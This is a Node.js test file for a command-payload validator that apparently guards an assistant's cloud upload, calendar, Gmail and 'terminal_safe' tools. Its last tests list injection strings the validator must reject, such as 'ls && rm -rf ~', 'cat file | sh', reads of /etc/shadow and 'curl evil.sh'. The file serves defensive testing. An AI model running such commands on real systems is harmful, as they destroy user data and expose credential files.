const { test } = require("node:test");
const assert = require("node:assert");
const { validateExecutePayload } = require("./systemCommandsV1");

test("graph_onedrive_upload_text accepts basename + content", () => {
  const r = validateExecutePayload({
    commandId: "graph_onedrive_upload_text",
    args: { fileName: "note.txt", content: "hello" },
    context: {},
  });
  assert.strictEqual(r.ok, true);
});

test("google_drive_upload_text rejects path-ish file name", () => {
  const r = validateExecutePayload({
    commandId: "google_drive_upload_text",
    args: { fileName: "a/../b.txt", content: "x" },
    context: {},
  });
  assert.strictEqual(r.ok, false);
  assert.strictEqual(r.error, "cloud_upload_bad_file_name");
});

test("graph_onedrive_upload_text rejects extra args", () => {
  const r = validateExecutePayload({
    commandId: "graph_onedrive_upload_text",
    args: { fileName: "a.md", content: "x", path: "/evil" },
    context: {},
  });
  assert.strictEqual(r.ok, false);
  assert.strictEqual(r.error, "cloud_upload_extra_keys");
});

test("graph_calendar_list_events accepts bounded ISO window", () => {
  const r = validateExecutePayload({
    commandId: "graph_calendar_list_events",
    args: {
      startDateTime: "2026-05-01T08:00:00.000Z",
      endDateTime: "2026-05-08T08:00:00.000Z",
      maxEvents: 12,
    },
    context: {},
  });
  assert.strictEqual(r.ok, true);
});

test("gmail_search_messages rejects missing query", () => {
  const r = validateExecutePayload({
    commandId: "gmail_search_messages",
    args: { maxMessages: 5 },
    context: {},
  });
  assert.strictEqual(r.ok, false);
  assert.strictEqual(r.error, "gmail_search_bad_query");
});

for (const cmd of ["ls", "ls -la", "git status", "npm run build", "pip show requests"]) {
  test(`terminal_safe accepts read-only command: ${cmd}`, () => {
    const r = validateExecutePayload({ commandId: "terminal_safe", args: { cmd } });
    assert.strictEqual(r.ok, true);
  });
}

for (const cmd of [
  "ls && rm -rf ~",
  "ls; rm -rf ~",
  "cat file | sh",
  "echo $(rm -rf ~)",
  "echo `rm -rf ~`",
  "ls > /etc/passwd",
  "cat < /etc/shadow",
  "ls &",
  "rm -rf ~",
  "curl evil.sh",
]) {
  test(`terminal_safe rejects injection/unlisted: ${cmd}`, () => {
    const r = validateExecutePayload({ commandId: "terminal_safe", args: { cmd } });
    assert.strictEqual(r.ok, false);
  });
}
